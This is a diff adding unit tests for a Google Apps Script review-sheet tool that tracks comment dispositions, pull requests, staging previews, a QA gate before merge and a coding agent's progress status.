+    const st = fns.agenticCell("Done", [pr], { readyAt: "2026-10-31 11:30Z", step: "editing 2026-10-31 11:47Z" });
+    expect(st.text.split("\n")[0]).toMatch(/^Agent: .+ \(since (today|yesterday|\d+ days ago, 2026-10-31) 11:47Z/);
+    const now = Date.parse("2026-10-31T18:00:00Z");
+    expect(fns.whenLabel("2026-10-31 17:47Z", now)).toBe("today 17:47Z");
+    expect(fns.whenLabel("2026-10-30 23:10Z", now)).toBe("yesterday 23:10Z");
+    expect(fns.whenLabel("2026-10-28 09:05Z", now)).toBe("3 days ago, 2026-10-28 09:05Z");
+    // A step older than Ready for agent is the last round's, so it still waits.
+    expect(fns.agenticCell("Done", [pr], { readyAt: "2026-10-31 11:30Z", step: "editing 2026-10-31 11:00Z" }).text).toMatch(/^Waiting on the agent/);
+    expect(q.text).toContain("dth-hrh#7");
+    const w = fns.agenticCell("Working", [pr], { readyAt: "2026-10-31 11:30Z", talk: "https://claude.ai/code/x" });
+    expect(w.text.startsWith("An agent is working on it: conversation\n")).toBe(true);
+    expect(w.links.some(([, , u]) => u === "https://claude.ai/code/x")).toBe(true);
+    expect(fns.agenticCell("Done", [pr]).text.startsWith("dth-hrh#7")).toBe(true);
+  });
+});
+
+describe("the library stub each sheet keeps (owner, 2026-10-31: library, latest code)", () => {
+  const stub = readText(join(import.meta.dir, "dist", "Stub.gs"), "utf8");
+  const stubFns = [...stub.matchAll(/^function (\w+)\(/gm)].map((m) => m[1]);
+  test("every library function the stub calls exists in Code.gs", () => {
+    for (const [, f] of stub.matchAll(/Review\.(\w+)\(/g)) expect(code).toMatch(new RegExp(`^function ${f}\\(`, "m"));
+  });
+  test("every menu item and trigger handler names a stub function", () => {
+    const named = [...code.matchAll(/addItem\('[^']*', '(\w+)'\)/g), ...code.matchAll(/newTrigger\('(\w+)'\)/g)].map((m) => m[1]);
+    expect(named.length).toBeGreaterThan(3);
+    for (const f of named) expect(stubFns).toContain(f);
+  });
+  test("dist/Stub.gs is current", () => {
+    expect(stub).toBe(readText(join(import.meta.dir, "stub.gs"), "utf8"));
+  });
+});
+
+describe("the QA gate before Ready for merge (owner, 2026-10-31)", () => {
+  const fake = {
+    newRichTextValue: () => {
+      const v = { text: "", links: [] as [number, number, string][] };
+      const r = { setText: (t: string) => ((v.text = t), r), setLinkUrl: (a: number, z: number, u: string) => (v.links.push([a, z, u]), r), setTextStyle: () => r, build: () => v };
+      return r;
+    },
+    newTextStyle: textStyle,
+  };
+  const { qaGate, stagingCell } = new Function("SpreadsheetApp", code + "\nreturn { qaGate, stagingCell };")(fake) as {
+    qaGate: (b: object, p: object[]) => { ok: boolean; text: string };
+    stagingCell: (u: string, b: object, p: object[]) => { text: string; links: [number, number, string][] };
+  };
+  const prs = [{ url: "https://github.com/litlfred/dth-hrh/pull/7", head: "b20534f0aa", done: "2026-10-31 08:10Z" }];
+  const b = (gate: string, qa = "") => ({ at: "2026-10-31 08:15Z", from: "b20534f", deploy: "deployed", gate, qa });
+  test("a pass counts only for the PR's head commit", () => {
+    expect(qaGate(b("Passed b20534f: dispositions match Blue and the diff"), prs)).toEqual({ ok: true, text: "\u2713 QA gate passed (b20534f)" });
+    expect(qaGate(b("Passed 1234567"), prs).text).toBe("\u26a0 QA gate stale: reviewed 1234567, PR now at b20534f: not ready for merge");
+    expect(qaGate(b("Passed: looks fine"), prs).ok).toBe(false);
+    expect(qaGate(b("Failed b20534f: No. 136 Accepted but the PR does not change it"), prs).text)
+      .toBe("\u26a0 QA gate failed: No. 136 Accepted but the PR does not change it");
+    expect(qaGate(b(""), prs).text).toBe("\u26a0 QA gate: no independent review yet: not ready for merge");
+    expect(qaGate(b("ok"), prs).ok).toBe(false);
+    expect(qaGate(b(""), []).text).toBe("");
+  });
+  test("Staging review links the QA report and shows the gate", () => {
+    const c = stagingCell("https://p/", b("Passed b20534f", "https://github.com/litlfred/dth-hrh/tree/qa-reports/pr/7/b20534f"), prs);
+    expect(T(c)).toBe("review \u00b7 QA report\n\u2713 QA gate passed (b20534f)");
+    expect(c.links.map((l) => l[2])).toEqual(["https://p/", "https://github.com/litlfred/dth-hrh/tree/qa-reports/pr/7/b20534f"]);
+  });
+});
+
+describe("the library's Update from GitHub (owner, 2026-10-31, option B)", () => {
+  const upd = readText(join(import.meta.dir, "updater.gs"), "utf8");
+  const isCode = new Function(upd + "\nreturn isReviewSheetCode_;")() as (t: string) => boolean;
+  test("dist/Updater.gs and dist/library-appsscript.json are current", () => {
+    expect(readText(join(import.meta.dir, "dist", "Updater.gs"), "utf8")).toBe(upd);
+    expect(readText(join(import.meta.dir, "dist", "library-appsscript.json"), "utf8"))
+      .toBe(readText(join(import.meta.dir, "library-appsscript.json"), "utf8"));
+  });
+  test("it recognises the published Code.gs, and nothing else", () => {
+    expect(isCode(readText(join(import.meta.dir, "dist", "Code.gs"), "utf8"))).toBe(true);
+    expect(isCode("<!DOCTYPE html><title>404</title>")).toBe(false);
+    expect(isCode(readText(join(import.meta.dir, "dist", "Stub.gs"), "utf8"))).toBe(false);
+  });
+  test("it fetches the file it was built beside, and the manifest grants what it calls", () => {
+    expect(upd).toContain("'" + CODE_GS_RAW + "'");
+    const scopes = JSON.parse(readText(join(import.meta.dir, "library-appsscript.json"), "utf8")).oauthScopes;
+    expect(scopes).toContain("https://www.googleapis.com/auth/script.projects");
+    expect(scopes).toContain("https://www.googleapis.com/auth/script.external_request");
+  });
+});
+
+describe("Needs human says what the person must do (owner, 2026-10-31)", () => {
+  test("Agentic status opens with the ask", () => {
+    const sheets = {
+      newRichTextValue: () => {
+        const v = { text: "" };
+        const b = { setText: (t: string) => ((v.text = t), b), setLinkUrl: () => b, setTextStyle: () => b, build: () => v };
+        return b;
+      },
+      newTextStyle: textStyle,
+    };
+    const agenticCell = new Function("SpreadsheetApp", `${code}\nreturn agenticCell;`)(sheets);
+    const t = agenticCell("Needs human", [{ url: "https://github.com/o/r/pull/1", done: "2026-10-31 10:00Z" }]).text;
+    expect(t.split("\n")[0]).toMatch(/^Needs you: answer the agent's question: .*Decision needed.*Ready for agent/);
+  });
+});
+
+describe("Decision needed stands out in the agent's feedback (owner, 2026-10-31)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { decisionSpans };`)({}) as { decisionSpans: (t: string) => [number, number][] };
+  test("the block runs from Decision needed to the next blank line", () => {
+    const t = "Proposed direction: x.\n\nDecision needed (No. 1): y?\nA. Yes\nB. No\n\nDecided (Q1): A.";
+    const [[a, z]] = fns.decisionSpans(t);
+    expect(t.slice(a, z)).toBe("Decision needed (No. 1): y?\nA. Yes\nB. No");
+  });
+  test("no block, no spans", () => {
+    expect(fns.decisionSpans("Decided (Q1): A.")).toEqual([]);
+    // The script's status line is bold as well, below a stale mark.
+    const st = "\u26a0 Stale: x\n\u23f3 r#1 open.\nProposal";
+    expect(fns.decisionSpans(st)).toEqual([[st.indexOf("\u23f3"), st.indexOf("\nProposal")]]);
+  });
+});
+
+describe("the timer runs every minute (owner, 2026-10-31)", () => {
+  test("a sheet on the old 5-minute timer moves itself to 1 minute, once", () => {
+    const made: number[] = [], removed: string[] = [];
+    const app = {
+      getProjectTriggers: () => [{ getHandlerFunction: () => "refreshIfDirty" }, { getHandlerFunction: () => "markDirty" }],
+      deleteTrigger: (t: { getHandlerFunction: () => string }) => removed.push(t.getHandlerFunction()),
+      newTrigger: () => ({ timeBased: () => ({ everyMinutes: (n: number) => ({ create: () => made.push(n) }) }) }),
+    };
+    const props: Record<string, string> = {};
+    const p = { getProperty: (k: string) => props[k] ?? null, setProperty: (k: string, v: string) => (props[k] = v) };
+    const f = new Function("SpreadsheetApp", `${code}\nreturn { init, upgradeTimer_ };`)({});
+    f.init({ ScriptApp: app });
+    f.upgradeTimer_(p);
+    f.upgradeTimer_(p);
+    expect(removed).toEqual(["refreshIfDirty"]);
+    expect(made).toEqual([1]);
+  });
+});
+
+describe("one agent column, status on top (owner, 2026-10-31, option A)", () => {
+  const { statusBlock, withProgress, nosText, STALE } = new Function(code + "\nreturn { statusBlock, withProgress, nosText, STALE };")() as {
+    statusBlock: (l: string, s: string, p: object[]) => { text: string; links: [number, number, string][] };
+    withProgress: (t: string, l: unknown) => string;
+    nosText: (n: string[]) => string;
+    STALE: string;
+  };
+  const prs = [{ url: "https://github.com/litlfred/smart-ra/pull/185", done: "2026-10-31 15:26Z", desc: "DPI-F at first use" }];
+  test("the block is the ⏳ line and one linked line per PR", () => {
+    const b = statusBlock("⏳ smart-ra#185 open.", "PR open", prs);
+    expect(b.text).toBe("⏳ smart-ra#185 open.\n↳ smart-ra#185 (PR open, 2026-10-31 15:26Z) · DPI-F at first use");
+    expect(b.links).toEqual([[23, 35, prs[0].url]]);
+    expect(b.text.slice(23, 35)).toBe("smart-ra#185");
+  });
+  test("it replaces the old block and never stacks, under the stale mark", () => {
+    const b = statusBlock("⏳ new.", "PR open", prs);
+    const once = withProgress(STALE + "\n⏳ old.\n↳ old PR line\nProposal", b);
+    expect(once).toBe(STALE + "\n" + b.text + "\nProposal");
+    expect(withProgress(once, b)).toBe(once);
+  });
+  test("the people's ask shows when they must answer", () => {
+    expect(statusBlock("", "Needs human", []).text).toMatch(/^↳ Needs you: answer the agent's question/);
+  });
+  test("a missing disposition names the comments compactly", () => {
+    expect(nosText(["139", "127", "128", "129", "134"])).toBe("Nos. 127 to 129, 134 and 139");
+  });
+});
+
+describe("Ready for agent: Yes, No, Completed (owner, 2026-10-31)", () => {
+  const { completeReady } = new Function(code + "\nreturn { completeReady };")() as {
+    completeReady: (s: object, csCol: number, prOf: object, stagingOf: object, builtOf: object, readyAt: object) => void;
+  };
+  const sheet = (ready: string) => {
+    const set: string[] = [];
+    const s = { header: ["Change-set", "Ready for agent"], rows: [["CS-001", ready]], top: 3,
+      sh: { getRange: () => ({ setValues: (v: string[][]) => set.push(v[0][0]) }) } };
+    return { s, set };
+  };
+  const prOf = { "CS-001": [{ url: "https://github.com/o/r/pull/1", head: "abcdef1", done: "2026-10-31 15:26Z" }] };
+  const live = { "CS-001": "https://p/" }, built = { "CS-001": { at: "2026-10-31 15:30Z", from: "abcdef1", deploy: "deployed" } };
+  test("Completed once the agent pushed after the Ready and the preview of it is live", () => {
+    const { s, set } = sheet("Yes");
+    completeReady(s, 0, prOf, live, built, { "CS-001": "2026-10-31 14:47Z" });
+    expect(set).toEqual(["Completed"]);
+  });
+  test("not while the preview is restaging, nor before the agent has acted", () => {
+    for (const [b, at] of [[{ ...built["CS-001"], deploy: "building" }, "2026-10-31 14:47Z"], [built["CS-001"], "2026-10-31 15:26Z"]] as const) {
+      const { s, set } = sheet("Yes");
+      completeReady(s, 0, prOf, live, { "CS-001": b }, { "CS-001": at });
+      expect(set).toEqual([]);
+    }
+  });
+});
+
+describe("Disposition (agent) shows its structure (owner, 2026-10-31)", () => {
+  const spans: [number, number][] = [];
+  const fake = {
+    newRichTextValue: () => {
+      const v = { text: "" };
+      const r = { setText: (t: string) => ((v.text = t), r), setLinkUrl: () => r, setTextStyle: (a: number, z: number, st?: { bold?: boolean }) => (st?.bold && spans.push([a, z]), r), build: () => v };
+      return r;
+    },
+    newTextStyle: textStyle,
+  };
+  const { dispositionCell } = new Function("SpreadsheetApp", code + "\nreturn { dispositionCell };")(fake) as { dispositionCell: (t: string, n: string[], h: object) => { text: string } };
+  test("labels and disposition words are bold", () => {
+    const text = "Decided (No. 1, d): A.\n\nOverall: All.\nNos. 1 and 2: Partially accepted. Done.";
+    const c = dispositionCell(text, ["1", "2"], {});
+    expect(spans.map(([a, z]) => c.text.slice(a, z))).toEqual(["Decided (No. 1, d):", "Overall:", "Nos. 1 and 2:", "Partially accepted"]);
+  });
+});
+
+describe("structured overflow lines (owner, 2026-10-31)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { descText, decisionSpans };`)({}) as {
+    descText: (d: string) => string; decisionSpans: (t: string) => [number, number][];
+  };
+  test("a; b; c becomes one bullet per line", () => {
+    expect(fns.descText("a (No. 326); b; c")).toBe("\n  • a (No. 326)\n  • b\n  • c");
+    expect(fns.descText("only one")).toBe(" · only one");
+  });
+  test("line-start labels and No. references are bold", () => {
+    const t = "What changed:\n  • x (No. 326)\nProposed direction: y, Nos. 1, 2 and 5.";
+    const bold = fns.decisionSpans(t).map(([a, z]) => t.slice(a, z));
+    expect(bold).toContain("What changed:");
+    expect(bold).toContain("Proposed direction:");
+    expect(bold).toContain("No. 326");
+    expect(bold).toContain("Nos. 1, 2 and 5");
+  });
+});
+
+describe("hover text on every column head (owner, 2026-10-31)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { headerNoteFor, headerNotes, HEADER_NOTES, NOTE_MARK };`)({}) as {
+    headerNoteFor: (k: string, h: string) => string; headerNotes: (ss: unknown) => void; NOTE_MARK: string;
+  };
+  test("every column of the six sheets' known heads has a note", () => {
+    const heads: [string, string[]][] = [
+      ["rpc", ["No.", "Sections", "Page", "Line no(s) / Table / Figure", "Comment / issue", "Suggested revision", "Change Set", "TWG (agent)", "TWG (human)", "Comment type", "Committee Feedback (initials)", "Disposition", "Status", "Agentic status", "Staging review"]],
+      ["rcs", ["Change-set", "Title", "Sections", "Pages", "Public Comments", "Suggested Revisions", "PC Committee Feedback", "Dispositions", "TWG (PCs)", "TWG (CS)", "Committee Feedback (CL)", "Architect Feedback (AB)", "Ready for agent", "Ready for merge", "Disposition (agent)", "Change Set Feedback (agent)", "Agentic status", "Staging review", "Agentic status (filter)"]],
+      ["draft", ["Change-set", "Title", "Selected Sections", "Section links", "Contributor Feedback (initials/name)", "Disposition", "Ready for agent", "Ready for merge", "Disposition (agent)", "Feedback (agent)", "Agentic status (filter)", "Issue", "Agentic status", "Staging review"]],
+      ["agent", ["No.", "Comment ref", "Agentic status", "Agentic action taken", "Agentic applied in (section / version)", "Agentic handled by", "Agentic date actioned", "Change-sets", "Change-set", "Title", "Issue", "Pull request (change set)", "Staging review page (change set)", "What the PRs changed (change set)", "Agent completed (UTC, change set)", "Feedback basis (change set)", "Staging built (UTC, change set)", "PR head (change set)", "Staging built from (change set)", "Staging deploy (change set)", "Disposition (change set)", "QA gate (change set)", "QA report (change set)", "Agent conversation (change set)"]],
+    ];
+    for (const [k, hs] of heads) for (const h of hs) expect([k, h, fns.headerNoteFor(k, h).length > 10]).toEqual([k, h, true]);
+    expect(fns.headerNoteFor("rpc", "Disposition")).toMatch(/committee/);
+    expect(fns.headerNoteFor("draft", "Disposition")).not.toMatch(/committee/);
+  });
+  test("no note names a colour", () => {
+    const notes = new Function("SpreadsheetApp", `${code}\nreturn HEADER_NOTES;`)({}) as Record<string, string>;
+    for (const [h, n] of Object.entries(notes)) expect([h, /\b(Blue|Green|Orange|Grey)\b/.test(n)]).toEqual([h, false]);
+  });
+  test("known heads get their note; an unknown head keeps its own, and loses an old script note", () => {
+    let written: string[][] | null = null;
+    const sheet = {
+      getName: () => "Review Change Sets", getLastColumn: () => 4, getLastRow: () => 5,
+      getRange: (_r: number, _c: number, _nr: number, nc: number) => ({
+        getDisplayValues: () => (nc === 1 ? [["Instructions"], ["Change-set"], ["CS-001"]] : [["Change-set", "Ready for agent", "Mine", "Old"]]),
+        getNotes: () => [["", "an old note", "my own note", "x" + fns.NOTE_MARK]],
+        setNotes: (n: string[][]) => { written = n; },
+      }),
+    };
+    const g = new Function("SpreadsheetApp", `${code}\nCFG = { RCS: "Review Change Sets" };\nreturn headerNotes;`)({}) as (ss: unknown) => void;
+    g({ getSheets: () => [sheet] });
+    expect(written![0][0]).toMatch(/change set id/);
+    expect(written![0][1]).toMatch(/^Yes: the direction is agreed/);
+    expect(written![0][2]).toBe("my own note");
+    expect(written![0][3]).toBe("");
+  });
+});
+
+describe("a PR's change list may run over several lines (owner, 2026-10-31)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { prDescs, descText };`)({}) as {
+    prDescs: (t: string) => string[]; descText: (d: string) => string;
+  };
+  test("bullets and a label line stay with their PR", () => {
+    expect(fns.prDescs("What the PRs changed:\n• a (No. 1)\n• b")).toEqual(["What the PRs changed:\n• a (No. 1)\n• b"]);
+    expect(fns.prDescs("first PR\nsecond PR")).toEqual(["first PR", "second PR"]);
+    expect(fns.prDescs("one\n• x\ntwo")).toEqual(["one\n• x", "two"]);
+  });
+  test("the label heads the bullets", () => {
+    expect(fns.descText("What the PRs changed:\n• a (No. 1)\n• b")).toBe(" · What the PRs changed:\n  • a (No. 1)\n  • b");
+  });
+});
+
+describe("unconfirmed dispositions are flagged and block the merge (owner, 2026-10-31, option A)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { dispositionProblems, progressLine };`)({}) as {
+    dispositionProblems: (t: string, n: string[], h?: Record<string, string>) => string;
+    progressLine: (o: object) => string;
+  };
+  test("a comment whose committee Disposition is Pending or empty is listed", () => {
+    const p = fns.dispositionProblems("No. 1: Accepted. x\nNo. 2: Noted. y\nNo. 3: Accepted. z", ["1", "2", "3"], { "1": "Pending", "2": "Noted", "3": "" });
+    expect(p).toBe("⚠ Not confirmed by the committee (Disposition still Pending): Nos. 1 and 3");
+    expect(fns.dispositionProblems("No. 1: Accepted. x", ["1"], {})).toBe("");
+  });
+  test("Ready for merge waits for confirmed dispositions", () => {
+    const l = fns.progressLine({ merge: true, prs: [{ url: "https://github.com/o/r/pull/1", head: "abc1234" }], built: { gate: "Passed abc1234: ok" }, disp: "dispositions not complete or not confirmed" });
+    expect(l).toMatch(/will not merge r#1 until every disposition is complete and confirmed by the committee\.$/);
+  });
+});
+
+describe("Dispositions confirmed, an Editor's multi-select (owner, 2026-10-31)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { dispositionProblems, confirmedNos };`)({}) as {
+    dispositionProblems: (t: string, n: string[], h?: Record<string, string>, c?: string[]) => string;
+    confirmedNos: (v: string, n: string[]) => string[];
+  };
+  test("Yes (or All) confirms every comment; No none; typed numbers confirm those", () => {
+    expect(fns.confirmedNos("All", ["1", "2"])).toEqual(["1", "2"]);
+    expect(fns.confirmedNos("Yes", ["1", "2"])).toEqual(["1", "2"]);
+    expect(fns.confirmedNos("No", ["1", "2"])).toEqual([]);
+    expect(fns.confirmedNos("No. 1, No. 3", ["1", "2"])).toEqual(["1", "3"]);
+  });
+  test("confirmed comments are no longer flagged; a stray number is", () => {
+    const t = "No. 1: Accepted. x\nNo. 2: Noted. y";
+    expect(fns.dispositionProblems(t, ["1", "2"], { "1": "Pending", "2": "Pending" }, ["1", "2"])).toBe("");
+    expect(fns.dispositionProblems(t, ["1", "2"], { "1": "Pending", "2": "Pending" }, ["1", "9"]))
+      .toBe("⚠ Not confirmed by the committee (Disposition still Pending): No. 2\n⚠ No. 9 is confirmed but is not in this change set");
+  });
+});
+
+describe("rows on the people's tabs are at most 10 lines high (owner, 2026-10-31)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { rowLines, runs };`)({}) as {
+    rowLines: (v: string[], w: number[]) => number; runs: (r: number[]) => [number, number][];
+  };
+  test("lines are estimated from the column width", () => {
+    expect(fns.rowLines(["a\nb\nc", "x".repeat(100)], [100, 78])).toBe(10);
+    expect(fns.rowLines(["short"], [200])).toBe(1);
+  });
+  test("consecutive rows are set in one call", () => {
+    expect(fns.runs([9, 3, 4, 5])).toEqual([[3, 3], [9, 1]]);
+  });
+});
+
+describe("the ⏳ line says where the agent is (owner, 2026-10-31)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { progressLine, agentStep, AGENT_STEPS };`)({}) as {
+    progressLine: (o: object) => string; agentStep: (c: string) => { name: string } | null; AGENT_STEPS: Record<string, string>;
+  };
+  const pr = { url: "https://github.com/o/r/pull/1", head: "abc1234", done: "2026-10-31 15:26Z" };
+  test("a step newer than the last push shows, with its time", () => {
+    expect(fns.progressLine({ prs: [pr], built: { step: "editing 2026-10-31 17:20Z" } })).toMatch(/^⏳ Agent: editing the document \(since (today|yesterday|\d+ days ago, 2026-10-31) 17:20Z/);
+  });
+  test("idle, an older step, or an unknown word shows nothing new", () => {
+    expect(fns.agentStep("idle 2026-10-31 17:20Z")).toBeNull();
+    expect(fns.agentStep("thinking 2026-10-31 17:20Z")).toBeNull();
+    expect(fns.progressLine({ prs: [pr], staging: "", built: { step: "editing 2026-10-31 15:00Z" } })).not.toMatch(/Agent:/);
+  });
+  test("a question for a person comes first", () => {
+    expect(fns.progressLine({ status: "Needs human", prs: [pr], built: { step: "proposing 2026-10-31 17:20Z" } })).toMatch(/^⏳ Needs you: answer the Decision needed/);
+  });
+  test("every step the tool writes is one the sheet knows", async () => {
+    const { STEPS } = await import("./agent-record.ts");
+    for (const s of STEPS) expect(s in fns.AGENT_STEPS).toBe(true);
+  });
+});
+
+describe("the status line comes back after the agent rewrites its cell (owner, 2026-10-31)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { ownText, progressLine };`)({}) as {
+    ownText: (v: string) => string; progressLine: (o: object) => string;
+  };
+  test("the script's own lines do not count as the agent's change", () => {
+    expect(fns.ownText("⏳ r#1 open.\n↳ r#1\n⚠ Stale: x\nWhat changed:\n• a")).toBe("What changed:\n• a");
+  });
+  test("a drafted proposal says to set Ready for agent", () => {
+    const pr = { url: "https://github.com/o/r/pull/1", head: "abc1234", done: "2026-10-31 15:26Z" };
+    expect(fns.progressLine({ prs: [pr], built: { step: "proposed 2026-10-31 17:30Z" } })).toMatch(/^⏳ Proposal ready \((today|yesterday|\d+ days ago, 2026-10-31) 17:30Z\): set Ready for agent to Yes/);
+  });
+});
+
+describe("data rows look like data rows (owner, 2026-10-31: \"why row 3 bold\")", () => {
+  test("a row that took the header's look gets the last row's format back; plain rows are left", () => {
+    const copies: Array<[number, number]> = [];
+    // Row 1 instructions, row 2 header, rows 3-4 data; row 3 inherited the header's bold.
+    const values = [["Instructions", ""], ["Change-set", "Title"], ["CS-001", "FDA"], ["CS-002", "Other"]];
+    const weights = [["bold", "bold"], ["normal", "bold"]];
+    const sh = {
+      getLastRow: () => 4, getLastColumn: () => 2, getMaxRows: () => 500,
+      getRange: (r: number, _c: number, n?: number) => ({
+        getDisplayValues: () => values.slice(r - 1, r - 1 + (n ?? 1)),
+        getFontWeights: () => weights, getVerticalAlignments: () => [["middle", "middle"], ["top", "top"]],
+        copyTo: (dest: { row: number }) => { copies.push([r, dest.row]); },
+        row: r,
+      }),
+    };
+    const SpreadsheetApp = { CopyPasteType: { PASTE_FORMAT: "f" } };
+    const normalizeRows = new Function("SpreadsheetApp", `${code}\nreturn normalizeRows;`)(SpreadsheetApp);
+    expect(normalizeRows(sh)).toBe(1);
+    expect(copies).toEqual([[500, 3]]);
+  });
+});
+
+describe("Agentic status sits left of its filter column (owner, 2026-10-31)", () => {
+  const placeBefore = new Function("SpreadsheetApp", `${code}\nreturn placeBefore;`)({});
+  const sheetWith = (header: string[], moves: Array<[number, number]>) => ({
+    getLastRow: () => 2, getLastColumn: () => header.length,
+    getRange: (r: number, c: number) => ({ getDisplayValues: () => [["Instructions", ...header.slice(1).map(() => "")], header], col: c }),
+    moveColumns: (range: { col: number }, to: number) => moves.push([range.col, to]),
+  });
+  test("moves it from after Issue to just before the filter", () => {
+    const moves: Array<[number, number]> = [];
+    expect(placeBefore(sheetWith(["Change-set", "Agentic status (filter)", "Issue", "Agentic status"], moves), "Agentic status", "Agentic status (filter)")).toBe(true);
+    expect(moves).toEqual([[4, 2]]);
+  });
+  test("leaves it when it is already there", () => {
+    const moves: Array<[number, number]> = [];
+    expect(placeBefore(sheetWith(["Change-set", "Agentic status", "Agentic status (filter)"], moves), "Agentic status", "Agentic status (filter)")).toBe(false);
+    expect(moves).toEqual([]);
   });
 });
